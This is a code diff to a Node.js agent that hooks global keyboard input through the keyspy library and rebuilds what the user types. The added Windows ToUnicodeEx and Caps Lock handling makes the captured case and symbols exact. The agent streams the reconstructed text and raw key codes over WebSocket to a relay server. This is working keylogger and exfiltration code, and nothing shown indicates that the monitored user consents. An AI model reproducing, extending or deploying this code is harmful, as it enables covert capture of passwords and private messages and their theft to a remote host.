@@ -15,6 +15,54 @@ const { URL } = require("node:url");
 const WebSocket = require("ws");
 const { GlobalKeyboardListener } = require("keyspy");
 
+/** Windows: map key name to typed character via ToUnicodeEx (correct case + symbols). */
+function createWindowsTypableCharResolver() {
+  if (process.platform !== "win32") {
+    return null;
+  }
+  try {
+    const koffi = require("koffi");
+    const user32 = koffi.load("user32.dll");
+    const GetKeyboardState = user32.func("bool __stdcall GetKeyboardState(_Out_ uint8 * lpKeyState)");
+    const GetKeyState = user32.func("short __stdcall GetKeyState(int nVirtKey)");
+    const ToUnicodeEx = user32.func(
+      "int __stdcall ToUnicodeEx(uint32 wVirtKey, uint32 wScanCode, const uint8 * lpKeyState, uint16 * pwszBuff, int cchBuff, uint32 wFlags, void * dwhkl)"
+    );
+    const GetKeyboardLayout = user32.func("void * __stdcall GetKeyboardLayout(uint32 idThread)");
+    const keyboardLayout = GetKeyboardLayout(0);
+    const outBuf = Buffer.alloc(8);
+
+    return (vKey, scanCode) => {
+      if (vKey == null || scanCode == null) {
+        return null;
+      }
+      const state = Buffer.alloc(256);
+      if (!GetKeyboardState(state)) {
+        return null;
+      }
+      state[vKey] |= 0x80;
+      const capsToggle = GetKeyState(0x14) & 1;
+      if (capsToggle) {
+        state[0x14] |= 0x01;
+      } else {
+        state[0x14] &= 0xfe;
+      }
+      const result = ToUnicodeEx(vKey, scanCode, state, outBuf, 4, 0, keyboardLayout);
+      if (result === 1) {
+        const code = outBuf.readUInt16LE(0);
+        if (code === 0) {
+          return null;
+        }
+        return String.fromCharCode(code);
+      }
+      return null;
+    };
+  } catch (err) {
+    console.error("[WinC] Windows character API unavailable:", err.message);
+    return null;
+  }
+}
+
 const CONNECT_TIMEOUT_MS = 12000;
 const PROBE_PORTS = [3847, 8080, 80];
 const FALLBACK_PORTS = ["3847", "8080", "80"];
@@ -23,10 +71,15 @@ const MODIFIERS = new Set([
   "RIGHT CTRL",
   "LEFT SHIFT",
   "RIGHT SHIFT",
+  "SHIFT",
+  "LSHIFT",
+  "RSHIFT",
   "LEFT ALT",
   "RIGHT ALT",
   "LEFT META",
   "RIGHT META",
+  "CAPS LOCK",
+  "CAPSLOCK",
 ]);
 
 function defaultPortForProtocol(protocol) {
@@ -222,13 +275,17 @@ function buildEventRecord(event, isDown, options = {}) {
     record.x = event.location[0];
     record.y = event.location[1];
   }
-  if (options.raw) {
-    record.scanCode = event.scanCode;
+  if (event.vKey !== undefined) {
     record.vKey = event.vKey;
-    if (event.rawKey?._nameRaw) record.rawName = event.rawKey._nameRaw;
+  }
+  if (event.scanCode !== undefined) {
+    record.scanCode = event.scanCode;
+  }
+  if (options.raw && event.rawKey?._nameRaw) {
+    record.rawName = event.rawKey._nameRaw;
   }
   if (record.state === "DOWN" && !mouse && options.typingState) {
-    const ch = options.typingState.keyToChar(name, mods);
+    const ch = options.typingState.keyToChar(name, mods, record.vKey, record.scanCode, isDown);
     if (ch && ch.length === 1) {
       record.char = ch;
     }
@@ -274,34 +331,86 @@ const SHIFT_SYMBOL_US = {
   "`": "~",
 };
 
-function isCapsLockKey(name) {
-  const upper = name.toUpperCase();
-  return upper === "CAPS LOCK" || upper === "CAPSLOCK" || upper === "CAPITAL";
+/** keyspy standardName → US base symbol (before shift). */
+const STANDARD_NAME_TO_CHAR = {
+  SEMICOLON: ";",
+  EQUALS: "=",
+  COMMA: ",",
+  MINUS: "-",
+  DOT: ".",
+  "FORWARD SLASH": "/",
+  BACKTICK: "`",
+  SECTION: "`",
+  "SQUARE BRACKET OPEN": "[",
+  "SQUARE BRACKET CLOSE": "]",
+  BACKSLASH: "\\",
+  QUOTE: "'",
+};
+
+function isShiftHeld(modifiers, isDown) {
+  if (modifiers.includes("Shift")) {
+    return true;
+  }
+  if (!isDown) {
+    return false;
+  }
+  return !!(isDown["LEFT SHIFT"] || isDown["RIGHT SHIFT"] || isDown.SHIFT || isDown.LSHIFT || isDown.RSHIFT);
 }
 
-function createTypingState() {
-  let capsLockOn = false;
+function readCapsLockOnWindows() {
+  if (process.platform !== "win32") {
+    return false;
+  }
+  try {
+    const koffi = require("koffi");
+    const GetKeyState = koffi.load("user32.dll").func("short __stdcall GetKeyState(int nVirtKey)");
+    return (GetKeyState(0x14) & 1) !== 0;
+  } catch {
+    return false;
+  }
+}
+
+function createTypingState(resolveWindowsChar) {
+  let capsLockOn = readCapsLockOnWindows();
+
+  function fallbackKeyToChar(key, modifiers, isDown) {
+    const shiftHeld = isShiftHeld(modifiers, isDown);
+    let symbolKey = key;
+    if (STANDARD_NAME_TO_CHAR[key] !== undefined) {
+      symbolKey = STANDARD_NAME_TO_CHAR[key];
+    }
+    const letter = key.length === 1 && /[A-Z]/i.test(key);
+    if (letter) {
+      const upper = shiftHeld !== capsLockOn;
+      return upper ? key.toUpperCase() : key.toLowerCase();
+    }
+    if (symbolKey.length === 1 && /[0-9]/.test(symbolKey)) {
+      return shiftHeld ? (SHIFT_NUMBER_US[symbolKey] ?? symbolKey) : symbolKey;
+    }
+    if (SHIFT_SYMBOL_US[symbolKey] !== undefined) {
+      return shiftHeld ? SHIFT_SYMBOL_US[symbolKey] : symbolKey;
+    }
+    if (key === "SPACE") return " ";
+    if (key === "TAB") return "\t";
+    return null;
+  }
 
   return {
+    syncCapsLockFromOs() {
+      capsLockOn = readCapsLockOnWindows();
+    },
     toggleCapsLock() {
       capsLockOn = !capsLockOn;
+      capsLockOn = readCapsLockOnWindows();
     },
-    keyToChar(key, modifiers) {
-      const shiftHeld = modifiers.includes("Shift");
-      const letter = key.length === 1 && /[A-Z]/i.test(key);
-      if (letter) {
-        const upper = shiftHeld !== capsLockOn;
-        return upper ? key.toUpperCase() : key.toLowerCase();
+    keyToChar(key, modifiers, vKey, scanCode, isDown) {
+      if (resolveWindowsChar) {
+        const ch = resolveWindowsChar(vKey, scanCode);
+        if (ch && ch.length === 1) {
+          return ch;
+        }
       }
-      if (key.length === 1 && /[0-9]/.test(key)) {
-        return shiftHeld ? (SHIFT_NUMBER_US[key] ?? key) : key;
-      }
-      if (SHIFT_SYMBOL_US[key] !== undefined) {
-        return shiftHeld ? SHIFT_SYMBOL_US[key] : key;
-      }
-      if (key === "SPACE") return " ";
-      if (key === "TAB") return "\t";
-      return null;
+      return fallbackKeyToChar(key, modifiers, isDown);
     },
   };
 }
@@ -336,7 +445,7 @@ function createTextBuffer(typingState) {
     getText() {
       return buffer;
     },
-    appendFromKey(record) {
+    appendFromKey(record, isDown) {
       const key = record.key;
       if (MODIFIERS.has(key)) {
         return false;
@@ -351,7 +460,7 @@ function createTextBuffer(typingState) {
       if (record.modifiers.some((m) => ["Ctrl", "Alt", "Win"].includes(m))) {
         return false;
       }
-      const ch = typingState.keyToChar(key, record.modifiers);
+      const ch = typingState.keyToChar(key, record.modifiers, record.vKey, record.scanCode, isDown);
       if (ch) {
         buffer += ch;
         return true;
@@ -494,7 +603,11 @@ async function main() {
   let shouldRun = true;
   let reconnectTimer = null;
   let activeRelayBase = options.server;
-  const typingState = createTypingState();
+  const resolveWindowsChar = createWindowsTypableCharResolver();
+  if (resolveWindowsChar) {
+    console.log("Using Windows keyboard layout for typed characters (case + symbols).");
+  }
+  const typingState = createTypingState(resolveWindowsChar);
   const textBuffer = createTextBuffer(typingState);
 
   const sendPayload = (payload) => {
@@ -560,7 +673,7 @@ async function main() {
     }
 
     if (record.state === "DOWN") {
-      if (record.type === "keyboard" && isCapsLockKey(record.key)) {
+      if (record.type === "keyboard" && (record.key === "CAPS LOCK" || record.key === "CAPSLOCK")) {
         typingState.toggleCapsLock();
       }
 
@@ -580,7 +693,7 @@ async function main() {
         }
         sendPayload(typingPreviewPayload(textBuffer, agentMeta));
       } else if (record.type === "keyboard") {
-        const changed = textBuffer.appendFromKey(record);
+        const changed = textBuffer.appendFromKey(record, isDown);
         if (changed) {
           sendPayload(typingPreviewPayload(textBuffer, agentMeta));
         }
